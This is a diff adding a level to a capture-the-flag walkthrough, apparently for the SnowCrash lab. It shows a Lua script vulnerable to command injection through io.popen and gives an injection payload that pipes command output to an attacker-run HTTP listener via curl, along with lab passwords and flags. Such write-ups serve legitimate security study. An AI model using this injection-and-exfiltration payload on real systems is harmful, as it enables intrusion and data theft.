@@ -321,3 +321,65 @@ If you get 'll', open the nc connection until you get the password.
 Password for flag10: `woupa2yuojeeaaed06riuj63c`
 
 Flag: `feulo4b72j7edeahuete3no7c`
+
+# Level11:
+
+```bash
+level11@SnowCrash:~$ ls -l
+total 4
+-rwsr-sr-x 1 flag11 level11 668 Mar  5  2016 level11.lua
+level11@SnowCrash:~$ 
+```
+
+```lua
+#!/usr/bin/env lua
+local socket = require("socket")
+local server = assert(socket.bind("127.0.0.1", 5151))
+
+function hash(pass)
+  prog = io.popen("echo "..pass.." | sha1sum", "r")
+  data = prog:read("*all")
+  prog:close()
+
+  data = string.sub(data, 1, 40)
+
+  return data
+end
+
+
+while 1 do
+  local client = server:accept()
+  client:send("Password: ")
+  client:settimeout(60)
+  local l, err = client:receive()
+  if not err then
+      print("trying " .. l)
+      local h = hash(l)
+
+      if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
+          client:send("Erf nope..\n");
+      else
+          client:send("Gz you dumb*\n")
+      end
+
+  end
+
+  client:close()
+end
+```
+
+Vulnerability: Command Injection in `prog = io.popen("echo "..pass.." | sha1sum", "r")`.
+
+Exploit:
+
+In your machine:
+```bash
+python3 -m http.server 8080
+```
+
+Payload:
+```
+$(curl [YOUR_IP]/?x=`getflag | base64`)
+```
+
+Flag: `fa6v5ateaw21peobuub8ipe6s`
